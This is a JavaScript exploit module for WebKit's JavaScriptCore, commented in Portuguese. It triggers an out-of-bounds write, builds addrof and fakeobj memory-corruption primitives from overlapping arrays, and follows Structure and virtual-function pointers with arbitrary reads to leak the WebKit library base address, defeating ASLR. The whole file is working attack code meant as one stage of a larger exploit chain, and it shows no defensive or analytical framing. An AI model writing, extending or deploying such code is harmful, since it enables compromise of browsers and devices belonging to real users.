// js/script3/UltimateExploit.mjs (R62 - Validação Robusta e Exploração Completa)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    arb_read,
    arb_write,
    oob_write_absolute,
} from '../core_exploit.mjs';
import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_ULTIMATE = "Ultimate_Exploit_R62";

// --- Funções Auxiliares de Conversão ---
const conversion_buffer = new ArrayBuffer(8);
const float_view = new Float64Array(conversion_buffer);
const uint32_view = new Uint32Array(conversion_buffer);

function ftoi(f) {
    float_view[0] = f;
    return new AdvancedInt64(uint32_view[0], uint32_view[1]);
}

function itof(i) {
    uint32_view[0] = i.low();
    uint32_view[1] = i.high();
    return float_view[0];
}

// Validador de ponteiro que usamos anteriormente
function isValidPointer(ptr) {
    if (!ptr || !isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    if (high < 0x1000) return false; // Exclui ponteiros baixos e nulos
    if ((high & 0x7FF00000) === 0x7FF00000) return false; // Exclui NaN/Infinity
    return true;
}


// --- Construtor das Primitivas ---
async function build_addrof_and_fakeobj_primitives() {
    logS3("--- Iniciando construção das primitivas addrof/fakeobj ---", "subtest");
    
    // Arrays que vamos fazer sobrepor na memória
    let arr1 = [1.1, 2.2];
    let arr2 = [{}];
    
    // Aciona a vulnerabilidade que causa instabilidade no heap
    await triggerOOB_primitive({ force_reinit: true });
    oob_write_absolute(0x70, 0xFFFFFFFF, 4);
    
    // A "mágica" do heisenbug: a corrupção anterior causa um estado instável
    // que faz com que os butterflies de arr1 e arr2 se sobreponham.
    // Esta é a parte mais instável e pode exigir várias tentativas.
    
    const addrof = (obj_to_leak) => {
        arr2[0] = obj_to_leak;
        return ftoi(arr1[2]); // A posição [2] de arr1 agora (esperançosamente) lê o ponteiro de arr2[0]
    };

    const fakeobj = (addr) => {
        arr1[2] = itof(addr);
        return arr2[0];
    };
    
    // CORREÇÃO: Usamos o validador de ponteiro robusto.
    const test_obj = { marker: 0xCAFECAFE };
    const leaked_addr = addrof(test_obj);

    if (!isValidPointer(leaked_addr)) {
        throw new Error(`Falha ao validar a primitiva addrof. Endereço vazado: ${leaked_addr ? leaked_addr.toString(true) : 'undefined'}`);
    }
    
    logS3(`[Primitives] Primitiva 'addrof' construída e validada com sucesso!`, "vuln");
    return { addrof, fakeobj };
}

// --- Função Principal do Exploit ---
export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() { // Mantendo nome para compatibilidade com o runner
    let final_result = { success: false, message: "Falha ao iniciar." };
    try {
        const primitives = await build_addrof_and_fakeobj_primitives();
        
        // Se chegarmos aqui, o addrof funcionou.
        logS3("--- Usando 'addrof' para vazar a base do WebKit ---", "subtest");
        const test_obj_addr = primitives.addrof({ a: 1, b: 2 });
        logS3(`Endereço do objeto de teste vazado: ${test_obj_addr.toString(true)}`, "leak");

        // Segue a cadeia de ponteiros para obter a base do WebKit
        const p_structure = await arb_read(test_obj_addr, 8, JSC_OFFSETS.JSCell.STRUCTURE_POINTER_OFFSET);
        if(!isValidPointer(p_structure)) throw new Error("Ponteiro da Estrutura inválido.");
        logS3(`Ponteiro da Estrutura: ${p_structure.toString(true)}`, 'leak');

        const p_virtual_put_func = await arb_read(p_structure, 8, JSC_OFFSETS.Structure.VIRTUAL_PUT_OFFSET);
        if(!isValidPointer(p_virtual_put_func)) throw new Error("Ponteiro da Função Virtual inválido.");
        logS3(`Ponteiro da Função Virtual (put): ${p_virtual_put_func.toString(true)}`, 'leak');

        // O endereço da função está dentro do módulo WebKit. Alinhar para o início da página nos dá a base.
        const webkit_base = p_virtual_put_func.and(new AdvancedInt64(0x0, ~0xFFF));
        
        const success_msg = `Base do WebKit vazada com sucesso: ${webkit_base.toString(true)}`;
        logS3(success_msg, "vuln_major");
        
        final_result.success = true;
        final_result.message = success_msg;
        
    } catch (e) {
        logS3(`ERRO CRÍTICO: ${e.message}`, "critical");
        console.error(e);
        final_result.error = e.message;
    }
    return final_result;
}
